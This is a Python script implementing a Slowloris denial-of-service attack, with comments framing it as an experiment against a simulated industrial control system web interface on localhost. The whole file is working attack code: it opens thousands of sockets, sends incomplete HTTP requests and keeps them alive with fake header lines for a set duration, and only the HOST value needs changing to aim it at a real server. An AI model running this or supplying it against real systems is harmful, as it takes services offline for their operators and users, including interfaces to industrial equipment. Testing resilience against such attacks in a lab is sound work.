import socket
import time

# ==============================
# Configuration parameters
# ==============================

HOST = "127.0.0.1"        # Target server address (ICS web interface simulation)
PORT = 8080               # HTTP service port
NUM_SOCKETS = 5000        # Number of concurrent connections (to be varied experimentally)
KEEP_ALIVE_INTERVAL = 10  # Interval (seconds) between partial header transmissions
ATTACK_DURATION = 120     # Total attack duration in seconds

# List to store active sockets
sockets = []

print("[+] Starting Slowloris DoS attack")
print(f"[+] Target: {HOST}:{PORT}")
print(f"[+] Opening {NUM_SOCKETS} connections")

# ==============================
# Phase 1: Open multiple connections
# ==============================

for i in range(NUM_SOCKETS):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((HOST, PORT))

        # Send an incomplete HTTP request
        s.send(b"GET / HTTP/1.1\r\n")
        s.send(f"Host: {HOST}\r\n".encode("utf-8"))

        sockets.append(s)
        print(f"[+] Socket {i + 1} connected")

    except Exception as e:
        print(f"[!] Failed to create socket {i + 1}: {e}")
        break

print(f"[+] {len(sockets)} sockets successfully opened")

# ==============================
# Phase 2: Keep connections alive
# ==============================

start_time = time.time()

try:
    while time.time() - start_time < ATTACK_DURATION:
        print("[+] Sending keep-alive headers...")
        for s in list(sockets):
            try:
                # Send a fake header line to keep the connection open
                s.send(b"X-a: b\r\n")
            except Exception:
                # Remove closed or broken sockets
                sockets.remove(s)
        time.sleep(KEEP_ALIVE_INTERVAL)

except KeyboardInterrupt:
    print("[!] Attack interrupted by user")

# ==============================
# Phase 3: Cleanup
# ==============================

print("[+] Closing all sockets")
for s in sockets:
    s.close()

print("[+] Slowloris attack finished")
